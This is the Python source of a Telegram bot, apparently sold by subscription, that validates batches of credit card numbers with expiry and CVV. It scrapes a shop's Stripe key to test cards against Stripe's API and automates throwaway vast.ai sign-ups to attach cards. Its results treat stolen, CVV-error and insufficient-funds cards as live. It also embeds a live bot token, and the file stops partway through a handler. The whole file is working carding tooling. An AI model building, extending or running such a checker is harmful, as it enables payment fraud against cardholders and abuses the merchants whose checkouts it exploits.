#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Obeida Online - Real Multi Gateway CC Checker Bot
Version: 16.0 - Final with Vault Gateway
Author: @ObeidaOnline
Channel: https://t.me/ObeidaTrading
"""

# ==================== التحقق من إصدار Python ====================
import sys
import platform

print(f"📌 إصدار Python: {sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")
print(f"📌 نظام التشغيل: {platform.system()} {platform.release()}")

# ==================== المكتبات المطلوبة ====================
import time
import json
import random
import string
import re
import os
import uuid
import threading
import asyncio
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional, Any
from urllib.parse import urlparse
import http.server
import socketserver
import shutil
import warnings

# استيراد المكتبات الخارجية
try:
    import requests
    import aiohttp
    from fake_useragent import UserAgent
    from faker import Faker
    from colorama import init, Fore, Style
    import telebot
    from telebot import types
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    from playwright.async_api import async_playwright, Page
except ImportError as e:
    print(f"❌ خطأ في استيراد المكتبات: {e}")
    sys.exit(1)

# تجاهل التحذيرات
warnings.filterwarnings("ignore")

# تهيئة الألوان
init(autoreset=True)

# ==================== إعدادات البوت ====================
BOT_TOKEN = "8375573526:AAFa882xWsLWl6LAfl0IcaZEU12hyP6YIy0"
ADMIN_IDS = [6207431030]
CHANNEL_USERNAME = "@ObeidaTrading"
DEV_CONTACT = "@Sz2zv"
BOT_USERNAME = "ObeidaOnlineBot"

CHANNEL_LINK = "https://t.me/ObeidaTrading"
SUPPORT_LINK = "https://t.me/Sz2zv"

# مجلدات التخزين
DATA_FOLDER = "data"
BACKUP_FOLDER = "backups"
TEMP_FOLDER = "temp"

# إنشاء المجلدات تلقائياً
os.makedirs(DATA_FOLDER, exist_ok=True)
os.makedirs(BACKUP_FOLDER, exist_ok=True)
os.makedirs(TEMP_FOLDER, exist_ok=True)

# ملفات التخزين
USERS_FILE = os.path.join(DATA_FOLDER, "users.json")
APPROVED_CARDS_FILE = os.path.join(DATA_FOLDER, "approved.txt")
DECLINED_CARDS_FILE = os.path.join(DATA_FOLDER, "declined.txt")
STATS_FILE = os.path.join(DATA_FOLDER, "stats.json")
SETTINGS_FILE = os.path.join(DATA_FOLDER, "settings.json")
GROUPS_FILE = os.path.join(DATA_FOLDER, "groups.json")

# ==================== إعدادات البوابات ====================
GATES = {
    "stripe": {
        "name": "💳 Stripe Gateway",
        "description": "فحص بطاقات عبر بوابة Stripe",
        "command": "st",
        "mass_command": "mass",
        "enabled": True,
        "timeout": 30,
        "icon": "💳",
        "default": True
    },
    "vault": {
        "name": "⚡ Vault Gateway",
        "description": "فحص بطاقات عبر بوابة متطورة",
        "command": "chk",
        "mass_command": "chkm",
        "enabled": True,
        "timeout": 45,
        "icon": "⚡",
        "default": False
    }
}

# ==================== نظام الاشتراكات ====================
SUBSCRIPTION_PLANS = {
    "day": {"name": "يومي", "price": "5K ID", "duration": 1},
    "week": {"name": "أسبوعي", "price": "15K ID", "duration": 7},
    "month": {"name": "شهري", "price": "40K ID", "duration": 30},
    "3months": {"name": "3 أشهر", "price": "100K ID", "duration": 90},
    "6months": {"name": "6 أشهر", "price": "180K ID", "duration": 180},
    "year": {"name": "سنوي", "price": "300K ID", "duration": 365}
}

# ==================== تهيئة البوت ====================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
fake = Faker()
ua = UserAgent()

# متغيرات عامة
user_last_file = {}

# ==================== إدارة البيانات ====================
class DataManager:
    
    @staticmethod
    def init_files():
        if not os.path.exists(USERS_FILE):
            users = {}
            for admin_id in ADMIN_IDS:
                users[str(admin_id)] = {
                    "user_id": admin_id,
                    "username": "admin",
                    "first_name": "Admin",
                    "joined_date": datetime.now().isoformat(),
                    "is_admin": True,
                    "is_subscribed": True,
                    "subscription": {"plan": "lifetime", "expiry": "2099-12-31", "active": True},
                    "usage": {"total_checks": 0, "approved": 0, "declined": 0},
                    "default_gate": "stripe"
                }
            DataManager.save_json(USERS_FILE, users)
        
        if not os.path.exists(STATS_FILE):
            DataManager.save_json(STATS_FILE, {
                "total_checks": 0,
                "total_approved": 0,
                "total_declined": 0,
                "gates_usage": {},
                "daily_stats": {},
                "last_backup": None
            })
        
        if not os.path.exists(SETTINGS_FILE):
            DataManager.save_json(SETTINGS_FILE, {
                "auto_backup": True,
                "backup_interval_hours": 24,
                "auto_clean": True,
                "clean_days": 30,
                "maintenance_mode": False,
                "maintenance_message": "البوت تحت الصيانة حالياً",
                "default_check_gate": "stripe",
                "group_mode": True,
                "require_sub_in_groups": True,
                "delay_between_cards": 5
            })
        
        if not os.path.exists(GROUPS_FILE):
            DataManager.save_json(GROUPS_FILE, {
                "allowed_groups": [],
                "blocked_groups": [],
                "group_settings": {}
            })
        
        for file in [APPROVED_CARDS_FILE, DECLINED_CARDS_FILE]:
            if not os.path.exists(file):
                with open(file, 'w', encoding='utf-8') as f:
                    f.write(f"# {'Approved' if 'approved' in file else 'Declined'} Cards\n")
                    f.write(f"# Created: {datetime.now()}\n")
    
    @staticmethod
    def load_json(file_path: str, default: Any = None) -> Any:
        try:
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    return json.load(f)
            return default if default is not None else {}
        except Exception:
            return default if default is not None else {}
    
    @staticmethod
    def save_json(file_path: str, data: Any) -> bool:
        try:
            if os.path.exists(file_path) and file_path.endswith('.json'):
                backup_path = os.path.join(BACKUP_FOLDER, f"{os.path.basename(file_path)}.{int(time.time())}.bak")
                shutil.copy2(file_path, backup_path)
            
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
            return True
        except Exception as e:
            print(f"❌ خطأ في حفظ {file_path}: {e}")
            return False
    
    @staticmethod
    def load_users() -> Dict:
        DataManager.init_files()
        users = DataManager.load_json(USERS_FILE, {})
        
        for uid, user in users.items():
            if "usage" not in user:
                user["usage"] = {"total_checks": 0, "approved": 0, "declined": 0}
            if "subscription" not in user:
                user["subscription"] = {"active": False}
            if "default_gate" not in user:
                user["default_gate"] = "stripe"
        
        return users
    
    @staticmethod
    def save_users(users: Dict) -> bool:
        return DataManager.save_json(USERS_FILE, users)
    
    @staticmethod
    def load_stats() -> Dict:
        DataManager.init_files()
        stats = DataManager.load_json(STATS_FILE, {})
        
        defaults = {
            "total_checks": 0,
            "total_approved": 0,
            "total_declined": 0,
            "gates_usage": {},
            "daily_stats": {},
            "last_backup": None
        }
        
        for key, value in defaults.items():
            if key not in stats:
                stats[key] = value
        
        return stats
    
    @staticmethod
    def save_stats(stats: Dict) -> bool:
        return DataManager.save_json(STATS_FILE, stats)
    
    @staticmethod
    def load_settings() -> Dict:
        settings = DataManager.load_json(SETTINGS_FILE, {
            "auto_backup": True,
            "backup_interval_hours": 24,
            "auto_clean": True,
            "clean_days": 30,
            "maintenance_mode": False,
            "default_check_gate": "stripe",
            "group_mode": True,
            "require_sub_in_groups": True,
            "delay_between_cards": 5
        })
        
        if "delay_between_cards" not in settings:
            settings["delay_between_cards"] = 5
        
        return settings
    
    @staticmethod
    def save_settings(settings: Dict) -> bool:
        return DataManager.save_json(SETTINGS_FILE, settings)
    
    @staticmethod
    def load_groups() -> Dict:
        return DataManager.load_json(GROUPS_FILE, {
            "allowed_groups": [],
            "blocked_groups": [],
            "group_settings": {}
        })
    
    @staticmethod
    def save_groups(groups: Dict) -> bool:
        return DataManager.save_json(GROUPS_FILE, groups)
    
    @staticmethod
    def save_card_result(card: str, gate: str, response: str, user_id: int, is_approved: bool):
        try:
            file_path = APPROVED_CARDS_FILE if is_approved else DECLINED_CARDS_FILE
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {gate} | User:{user_id} | {card} | {response}\n")
        except:
            pass
    
    @staticmethod
    def get_user_subscription(user_id: int) -> Optional[Dict]:
        users = DataManager.load_users()
        user = users.get(str(user_id), {})
        sub = user.get("subscription", {})
        if sub.get("active"):
            expiry = sub.get("expiry")
            if expiry and expiry != "2099-12-31":
                try:
                    expiry_date = datetime.fromisoformat(expiry)
                    if expiry_date < datetime.now():
                        sub["active"] = False
                        DataManager.save_users(users)
                        return None
                except:
                    pass
            return sub
        return None
    
    @staticmethod
    def check_access(user_id: int, chat_id: int = None) -> bool:
        if user_id in ADMIN_IDS:
            return True
        
        settings = DataManager.load_settings()
        if settings.get("maintenance_mode", False):
            return False
        
        if chat_id and chat_id < 0:
            groups = DataManager.load_groups()
            if chat_id in groups.get("blocked_groups", []):
                return False
            allowed = groups.get("allowed_groups", [])
            if allowed and chat_id not in allowed:
                return False
            group_set = groups.get("group_settings", {}).get(str(chat_id), {})
            if group_set.get("disabled", False):
                return False
            if settings.get("require_sub_in_groups", True):
                return DataManager.get_user_subscription(user_id) is not None
            return True
        
        return DataManager.get_user_subscription(user_id) is not None
    
    @staticmethod
    def get_user_default_gate(user_id: int) -> str:
        users = DataManager.load_users()
        user = users.get(str(user_id), {})
        return user.get("default_gate", "stripe")
    
    @staticmethod
    def set_user_default_gate(user_id: int, gate: str) -> bool:
        if gate not in GATES:
            return False
        users = DataManager.load_users()
        uid = str(user_id)
        if uid not in users:
            users[uid] = {
                "user_id": user_id,
                "joined_date": datetime.now().isoformat(),
                "usage": {"total_checks": 0, "approved": 0, "declined": 0}
            }
        users[uid]["default_gate"] = gate
        return DataManager.save_users(users)
    
    @staticmethod
    def add_subscription(user_id: int, days: int) -> bool:
        users = DataManager.load_users()
        uid = str(user_id)
        
        if uid not in users:
            users[uid] = {
                "user_id": user_id,
                "joined_date": datetime.now().isoformat(),
                "usage": {"total_checks": 0, "approved": 0, "declined": 0}
            }
        
        expiry = datetime.now() + timedelta(days=days)
        
        users[uid]["subscription"] = {
            "plan": f"{days} يوم",
            "expiry": expiry.isoformat(),
            "active": True,
            "added_by": "admin",
            "added_date": datetime.now().isoformat(),
            "duration_days": days
        }
        
        return DataManager.save_users(users)
    
    @staticmethod
    def remove_subscription(user_id: int) -> bool:
        users = DataManager.load_users()
        if str(user_id) in users:
            users[str(user_id)]["subscription"] = {"active": False}
            return DataManager.save_users(users)
        return False
    
    @staticmethod
    def update_usage(user_id: int, gate: str, result: str):
        users = DataManager.load_users()
        stats = DataManager.load_stats()
        
        uid = str(user_id)
        if uid not in users:
            users[uid] = {
                "user_id": user_id,
                "joined_date": datetime.now().isoformat(),
                "usage": {"total_checks": 0, "approved": 0, "declined": 0}
            }
        
        is_approved = any(x in result for x in [
            "✅", "LIVE", "Approved", "approved", "مقبولة",
            "CVV ERROR", "INSUFFICIENT", "RISK CARD"
        ])
        
        usage = users[uid].get("usage", {"total_checks": 0, "approved": 0, "declined": 0})
        usage["total_checks"] += 1
        
        if is_approved:
            usage["approved"] += 1
            stats["total_approved"] = stats.get("total_approved", 0) + 1
        else:
            usage["declined"] += 1
            stats["total_declined"] = stats.get("total_declined", 0) + 1
        
        users[uid]["usage"] = usage
        
        stats["total_checks"] = stats.get("total_checks", 0) + 1
        stats["gates_usage"][gate] = stats["gates_usage"].get(gate, 0) + 1
        
        today = datetime.now().strftime("%Y-%m-%d")
        if today not in stats["daily_stats"]:
            stats["daily_stats"][today] = {"checks": 0, "approved": 0}
        stats["daily_stats"][today]["checks"] += 1
        if is_approved:
            stats["daily_stats"][today]["approved"] += 1
        
        DataManager.save_users(users)
        DataManager.save_stats(stats)
    
    @staticmethod
    def auto_backup():
        settings = DataManager.load_settings()
        if not settings.get("auto_backup", True):
            return
        
        stats = DataManager.load_stats()
        last_backup = stats.get("last_backup")
        
        if last_backup:
            try:
                last_time = datetime.fromisoformat(last_backup)
                hours_passed = (datetime.now() - last_time).total_seconds() / 3600
                if hours_passed < settings.get("backup_interval_hours", 24):
                    return
            except:
                pass
        
        backup_name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        backup_dir = os.path.join(BACKUP_FOLDER, backup_name)
        os.makedirs(backup_dir, exist_ok=True)
        
        for file in os.listdir(DATA_FOLDER):
            src = os.path.join(DATA_FOLDER, file)
            if os.path.isfile(src):
                dst = os.path.join(backup_dir, file)
                shutil.copy2(src, dst)
        
        stats["last_backup"] = datetime.now().isoformat()
        DataManager.save_stats(stats)
        
        backups = sorted([d for d in os.listdir(BACKUP_FOLDER) if d.startswith("backup_")])
        if len(backups) > 10:
            for old_backup in backups[:-10]:
                shutil.rmtree(os.path.join(BACKUP_FOLDER, old_backup))
        
        print(f"✅ تم عمل نسخة احتياطية: {backup_name}")
    
    @staticmethod
    def auto_clean():
        settings = DataManager.load_settings()
        if not settings.get("auto_clean", True):
            return
        
        clean_days = settings.get("clean_days", 30)
        cutoff = datetime.now() - timedelta(days=clean_days)
        
        for file_path in [APPROVED_CARDS_FILE, DECLINED_CARDS_FILE]:
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                
                new_lines = []
                for line in lines:
                    if line.startswith('#'):
                        new_lines.append(line)
                    else:
                        try:
                            date_str = line.split(']')[0].strip('[')
                            line_date = datetime.strptime(date_str, '%Y-%m-%d %H:%M:%S')
                            if line_date > cutoff:
                                new_lines.append(line)
                        except:
                            new_lines.append(line)
                
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.writelines(new_lines)
        
        print(f"✅ تم التنظيف التلقائي للبيانات الأقدم من {clean_days} يوم")

# ==================== أدوات مساعدة ====================
class Helpers:
    @staticmethod
    def parse_card(card_str: str) -> Optional[Dict]:
        try:
            card_str = re.sub(r'[;:,\s/]+', '|', card_str.strip())
            if '|' in card_str:
                parts = card_str.split('|')
                if len(parts) >= 4:
                    number = re.sub(r'\D', '', parts[0])
                    month = re.sub(r'\D', '', parts[1])
                    year = re.sub(r'\D', '', parts[2])
                    cvv = re.sub(r'\D', '', parts[3])
                    
                    if len(number) >= 15 and len(number) <= 19:
                        if len(month) == 1:
                            month = f"0{month}"
                        if len(year) == 4:
                            year = year[-2:]
                        if len(cvv) >= 3 and len(cvv) <= 4:
                            return {
                                'number': number,
                                'month': month,
                                'year': year,
                                'cvv': cvv,
                                'original': card_str,
                                'name': parts[4] if len(parts) > 4 else "Card Holder"
                            }
            return None
        except:
            return None
    
    @staticmethod
    def extract_cards_from_text(text: str) -> List[Dict]:
        cards = []
        lines = text.strip().split('\n')
        for line in lines:
            line = line.strip()
            if line and not line.startswith('#'):
                card = Helpers.parse_card(line)
                if card and Helpers.luhn_check(card['number']):
                    cards.append(card)
        return cards
    
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        try:
            card_number = re.sub(r'[\s-]', '', card_number)
            if not card_number.isdigit():
                return False
            if len(card_number) < 13 or len(card_number) > 19:
                return False
            digits = [int(d) for d in card_number]
            checksum = 0
            for i, digit in enumerate(reversed(digits)):
                if i % 2 == 1:
                    digit *= 2
                    if digit > 9:
                        digit -= 9
                checksum += digit
            return checksum % 10 == 0
        except Exception:
            return False
    
    @staticmethod
    def get_card_brand(number: str) -> str:
        patterns = {
            'visa': r'^4',
            'mastercard': r'^5[1-5]',
            'amex': r'^3[47]',
            'discover': r'^6(?:011|5)',
            'jcb': r'^(?:2131|1800|35)'
        }
        for brand, pattern in patterns.items():
            if re.match(pattern, number):
                return brand.capitalize()
        return "Unknown"
    
    @staticmethod
    def get_bin_info(bin_num: str) -> Dict:
        try:
            r = requests.get(f"https://lookup.binlist.net/{bin_num[:6]}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                return {
                    "brand": data.get('scheme', 'Unknown').upper(),
                    "type": data.get('type', 'Unknown').upper(),
                    "bank": data.get('bank', {}).get('name', 'Unknown'),
                    "country": data.get('country', {}).get('name', 'Unknown'),
                    "flag": data.get('country', {}).get('emoji', '🏁')
                }
        except:
            pass
        return {
            "brand": "Unknown",
            "type": "Unknown",
            "bank": "Unknown",
            "country": "Unknown",
            "flag": "🏁"
        }
    
    @staticmethod
    def get_chat_type(chat_id: int) -> str:
        if chat_id > 0:
            return "private"
        return "group"

# ==================== تنسيق النتائج ====================
class ResultFormatter:
    
    @staticmethod
    def format_mass_result_header(total_cards: int, gate_name: str) -> str:
        return f"""
🚀  {gate_name} 🚀
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
"""
    
    @staticmethod
    def format_card_result(card: str, result: str, is_approved: bool) -> str:
        number = card.split('|')[0] if '|' in card else card
        masked = f"{number[:6]}xxxxxx{number[-4:]}"
        status_text = "✅ LIVE" if is_approved else "❌ DECLINED"
        
        if "cvv" in result.lower():
            status_text = "💳 LIVE - CVV ERROR"
        elif "insufficient" in result.lower():
            status_text = "💰 LIVE - INSUFFICIENT"
        
        return f"""
𒊹︎︎︎ 𝗖𝗖 ⌁ {masked}
𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ {status_text}
"""
    
    @staticmethod
    def format_mass_result_footer(approved: int, declined: int, total: int) -> str:
        return f"""
𒊹︎︎︎ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ ⌁ {approved}
𒊹︎︎︎ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ ⌁ {declined}

𝗧𝗢𝗧𝗔𝗟 💀 ➺ [ {total} ]
━━━━━━━━━━━━
🆔 Obeida Online | @ObeidaTrading
"""
    
    @staticmethod
    def format_single_result(card: str, result: str, is_approved: bool, gate_name: str, bin_info: Dict = None) -> str:
        number = card.split('|')[0] if '|' in card else card
        masked = f"{number[:6]}xxxxxx{number[-4:]}"
        
        if is_approved:
            if "cvv" in result.lower():
                status_text = "💳 LIVE - CVV ERROR"
            elif "insufficient" in result.lower():
                status_text = "💰 LIVE - INSUFFICIENT FUNDS"
            else:
                status_text = "✅ LIVE - CARD APPROVED"
        else:
            status_text = "❌ DECLINED"
        
        if bin_info:
            bin_text = f"""
𒊹︎︎︎ 𝗕𝗜𝗡 ⌁ {number[:6]}
𒊹︎︎︎ 𝗕𝗥𝗔𝗡𝗗 ⌁ {bin_info.get('brand', 'Unknown')}
𒊹︎︎︎ 𝗕𝗔𝗡𝗞 ⌁ {bin_info.get('bank', 'Unknown')}
𒊹︎︎︎ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⌁ {bin_info.get('country', 'Unknown')} {bin_info.get('flag', '🏁')}
"""
        else:
            bin_text = ""
        
        return f"""
🚀  {gate_name} 🚀
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌

𒊹︎︎︎ 𝗖𝗖 ⌁ {masked}
𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ {status_text}
{bin_text}
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
🆔 Obeida Online | @ObeidaTrading
"""

# ==================== بوابة Stripe ====================
class StripeGateway:
    
    @staticmethod
    def generate_random_email():
        username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
        number = random.randint(100, 9999)
        domains = ['gmail.com', 'yahoo.com', 'outlook.com']
        return f"{username}{number}@{random.choice(domains)}"
    
    async def process_card(self, card_data: Dict) -> Tuple[bool, str]:
        try:
            site_url = "https://copenhagensilver.com/my-account/"
            timeout = aiohttp.ClientTimeout(total=60)
            connector = aiohttp.TCPConnector(ssl=False)
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                random_ua = ua.random
                headers = {'user-agent': random_ua}
                
                resp = await session.get(site_url, headers=headers)
                text = await resp.text()
                
                stripe_key = re.search(r'pk_(live|test)_[a-zA-Z0-9]{24,}', text)
                stripe_key = stripe_key.group(0) if stripe_key else 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
                
                stripe_headers = {
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                    'user-agent': random_ua
                }
                
                stripe_data = {
                    'type': 'card',
                    'card[number]': card_data['number'],
                    'card[cvc]': card_data['cvv'],
                    'card[exp_month]': card_data['month'],
                    'card[exp_year]': card_data['year'],
                    'billing_details[address][country]': 'US',
                    'key': stripe_key
                }
                
                pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
                pm_json = await pm_resp.json()
                
                if 'error' in pm_json:
                    err = pm_json['error']
                    code = err.get('decline_code', '')
                    
                    if code in ['incorrect_cvc', 'invalid_cvc']:
                        return True, "💳 CVV ERROR"
                    elif code == 'insufficient_funds':
                        return True, "💰 INSUFFICIENT FUNDS"
                    elif code in ['stolen_card', 'lost_card']:
                        return True, "⚠️ RISK CARD"
                    return False, f"❌ {err.get('message', 'DECLINED')[:40]}"
                
                return True, "✅ APPROVED"
                
        except Exception as e:
            return False, f"⚠️ خطأ: {str(e)[:40]}"

# ==================== بوابة Vault ====================
class VaultGateway:
    
    def __init__(self):
        self.device = {
            'viewport': {'width': 390, 'height': 844},
            'user_agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
        }
    
    def generate_random_email(self) -> str:
        random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        return f"{random_string}@gmail.com"
    
    async def check_card(self, card_data: Dict) -> Tuple[bool, str]:
        """فحص بطاقة عبر البوابة المتطورة"""
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context(
                    viewport=self.device['viewport'],
                    user_agent=self.device['user_agent']
                )
                page = await context.new_page()
                
                email = self.generate_random_email()
                password = "Obeida059@"
                
                await page.goto("https://cloud.vast.ai/create/", timeout=30000)
                await page.wait_for_timeout(2000)
                
                await page.locator('[data-testid="vast-main-login-button"]').click()
                await page.wait_for_timeout(2000)
                
                await page.locator('#\\:r12\\:').fill(email)
                await page.locator('#\\:r14\\:').fill(password)
                await page.locator('#\\:r15\\:').fill(password)
                await page.locator('div.MuiDialog-root label:nth-of-type(1) input').click()
                await page.locator('[data-testid="auth-submit-login-signup"]').click()
                await page.wait_for_timeout(3000)
                
                await page.locator('div:nth-of-type(2) > li:nth-of-type(1) span.vast-typography').click()
                await page.wait_for_timeout(2000)
                await page.locator('[data-testid="billing-page-payment-methods-add-card-button"]').click()
                await page.wait_for_timeout(5000)
                
                expiry = f"{card_data['month']}/{card_data['year']}"
                name = card_data.get('name', 'Card Holder')
                
                await page.locator("#cardNumber").fill(card_data['number'])
                await page.locator("#cardExpiry").fill(expiry)
                await page.locator("#cardCvc").fill(card_data['cvv'])
                await page.locator("#billingName").fill(name)
                await page.locator("#billingCountry").fill("US")
                await page.locator("#billingPostalCode").fill("90003")
                
                await page.locator('div.SubmitButton-IconContainer').click()
                
                try:
                    await page.wait_for_url(lambda url: 'billing?session_id=' in url, timeout=15000)
                    await browser.close()
                    return True, "✅ البطاقة مقبولة"
                except Exception:
                    current_url = page.url
                    await browser.close()
                    
                    if 'stripe.com' in current_url:
                        return True, "💳 CVV ERROR - البطاقة حية"
                    else:
                        return False, "❌ البطاقة مرفوضة"
                        
        except Exception as e:
            return False, f"⚠️ خطأ: {str(e)[:40]}"

# ==================== بوابات الفحص ====================
class RealGateways:
    def __init__(self):
        self.stripe = StripeGateway()
        self.vault = VaultGateway()
    
    async def check_card(self, gate: str, card: Dict) -> Tuple[bool, str]:
        if gate == 'stripe':
            return await self.stripe.process_card(card)
        elif gate == 'vault':
            return await self.vault.check_card(card)
        else:
            return False, "❌ بوابة غير مدعومة"

# ==================== مدير الفحص المتعدد ====================
class MassCheckManager:
    def __init__(self):
        self.active_checks = {}
        self.user_current_check = {}
    
    def start_check(self, user_id: int, chat_id: int, cards: List[Dict], gate: str, message_id: int = None) -> int:
        if user_id in self.user_current_check:
            self.stop_check(user_id)
        
        check_id = int(time.time() * 1000)
        
        self.active_checks[check_id] = {
            'user_id': user_id,
            'chat_id': chat_id,
            'cards': cards,
            'gate': gate,
            'total': len(cards),
            'checked': 0,
            'approved': 0,
            'declined': 0,
            'stop': False,
            'message_id': message_id,
            'start_time': datetime.now()
        }
        
        self.user_current_check[user_id] = check_id
        return check_id
    
    def stop_check(self, user_id: int) -> bool:
        if user_id in self.user_current_check:
            check_id = self.user_current_check[user_id]
            if check_id in self.active_checks:
                self.active_checks[check_id]['stop'] = True
                return True
        return False
    
    def get_check(self, user_id: int) -> Optional[Dict]:
        if user_id in self.user_current_check:
            check_id = self.user_current_check[user_id]
            return self.active_checks.get(check_id)
        return None
    
    def remove_check(self, user_id: int):
        if user_id in self.user_current_check:
            check_id = self.user_current_check[user_id]
            if check_id in self.active_checks:
                del self.active_checks[check_id]
            del self.user_current_check[user_id]
    
    def is_checking(self, user_id: int) -> bool:
        if user_id in self.user_current_check:
            check_id = self.user_current_check[user_id]
            if check_id in self.active_checks:
                return not self.active_checks[check_id].get('stop', False)
        return False

# ==================== واجهة المستخدم ====================
class UserInterface:
    @staticmethod
    def main_menu(chat_type: str = "private"):
        markup = InlineKeyboardMarkup(row_width=2)
        
        if chat_type == "private":
            btns = [
                InlineKeyboardButton("💳 Stripe", callback_data="gate_stripe"),
                InlineKeyboardButton("⚡ Vault", callback_data="gate_vault"),
                InlineKeyboardButton("📁 فحص ملف", callback_data="mass_check"),
                InlineKeyboardButton("⚙️ البوابة الافتراضية", callback_data="default_gate"),
                InlineKeyboardButton("⏱️ ضبط المدة", callback_data="set_delay"),
                InlineKeyboardButton("👤 حسابي", callback_data="my_profile"),
                InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
                InlineKeyboardButton("💎 الاشتراك", callback_data="subscribe"),
                InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
                InlineKeyboardButton("👨‍💻 المطور", url=SUPPORT_LINK)
            ]
        else:
            btns = [
                InlineKeyboardButton("💳 Stripe", callback_data="gate_stripe"),
                InlineKeyboardButton("⚡ Vault", callback_data="gate_vault"),
                InlineKeyboardButton("📁 فحص آخر ملف", callback_data="check_last_file"),
                InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
                InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
                InlineKeyboardButton("👨‍💻 المطور", url=SUPPORT_LINK)
            ]
        
        markup.add(*btns)
        return markup
    
    @staticmethod
    def default_gate_menu(current_gate: str):
        markup = InlineKeyboardMarkup(row_width=2)
        for gate_id, gate in GATES.items():
            status = "✅ " if gate_id == current_gate else ""
            markup.add(InlineKeyboardButton(f"{status}{gate['icon']} {gate['name']}", callback_data=f"set_default_{gate_id}"))
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_main"))
        return markup
    
    @staticmethod
    def back_button(callback="back_main"):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data=callback))
        return markup
    
    @staticmethod
    def stop_button(check_id: int):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ إيقاف الفحص", callback_data=f"stop_{check_id}"))
        return markup

# ==================== معالج الأوامر ====================
class CommandHandler:
    def __init__(self):
        self.gateways = RealGateways()
        self.ui = UserInterface()
        self.mass_manager = MassCheckManager()
        self.user_last_file = user_last_file
        self.start_auto_tasks()
    
    def start_auto_tasks(self):
        def auto_tasks():
            while True:
                try:
                    DataManager.auto_backup()
                    DataManager.auto_clean()
                except Exception as e:
                    print(f"⚠️ خطأ في المهام التلقائية: {e}")
                time.sleep(3600)
        
        thread = threading.Thread(target=auto_tasks, daemon=True)
        thread.start()
    
    def check_sub(self, message) -> bool:
        return DataManager.check_access(message.from_user.id, message.chat.id)
    
    def save_last_file(self, user_id: int, file_id: str, file_name: str, content: str):
        self.user_last_file[user_id] = {
            "file_id": file_id,
            "file_name": file_name,
            "content": content,
            "timestamp": datetime.now().isoformat()
        }
    
    def get_last_file(self, user_id: int) -> Optional[Dict]:
        return self.user_last_file.get(user_id)
    
    def handle_start(self, message):
        user = message.from_user
        chat_id = message.chat.id
        chat_type = Helpers.get_chat_type(chat_id)
        
        users = DataManager.load_users()
        uid = str(user.id)
        
        if uid not in users:
            users[uid] = {
                "user_id": user.id,
                "username": user.username,
                "first_name": user.first_name,
